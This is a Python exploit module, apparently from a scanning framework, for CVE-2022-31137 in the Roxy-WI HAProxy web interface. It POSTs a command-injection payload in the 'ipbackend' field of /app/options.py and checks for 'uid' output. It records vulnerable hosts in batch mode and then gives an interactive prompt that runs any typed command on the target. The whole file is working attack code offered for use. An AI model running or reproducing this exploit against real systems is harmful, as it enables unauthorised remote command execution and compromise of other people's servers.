#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt

urllib3.disable_warnings()


class Cve_2022_31137:

    def run(self, urls):
        url = urls + '/app/options.py'
        header = {
            "Host": urls.split("://")[-1],
            "User-Agent": self.headers,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',

        }
        # print(head)
        data = f"alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bid+%23%23&backend_server=127.0.0.1"
        try:
            response = requests.post(url, data=data, headers=header, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            if response.status_code == 200 and "uid" in response.text:
                OutPrintInfoSuc("Haproxy", f'存在Haproxy命令执行 {url}')
                if self.batch:
                    with open("./result/roxywi_2022_31137.txt","a") as w:
                        w.write(f"{url}\n")
                # OutPrintInfo("Haproxy", response.text.strip())
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Haproxy", '不存在Haproxy命令执行')
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Haproxy", '不存在Haproxy命令执行')
            return False
    def run2(self, urls,cmd="id"):
        url = urls + '/app/options.py'
        header = {
            "Host": urls.split("://")[-1],
            "User-Agent": self.headers,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',

        }
        # print(head)
        data = f"alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3B{cmd}+%23%23&backend_server=127.0.0.1"
        try:
            response = requests.post(url, data=data, headers=header, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            if response.status_code == 200:
                OutPrintInfo("Haproxy", response.text.strip())
                return True
            else:
                OutPrintInfo("Haproxy", '不存在Haproxy命令执行')
                return False
        except Exception as e:
            OutPrintInfo("Haproxy", e)
            return False
    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Haproxy", '开始执行Haproxy命令执行...')
        if self.run(url):
            if not self.batch:
                choose = Prompt.ask("[b cyan]是否进行漏洞利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    while True:
                        cmd = Prompt.ask("[b red]输入需要执行到命令")
                        if cmd == "exit":
                            break
                        self.run2(url,cmd)
        if not self.batch:
            OutPrintInfo("Haproxy", 'Haproxy-命令执行结束')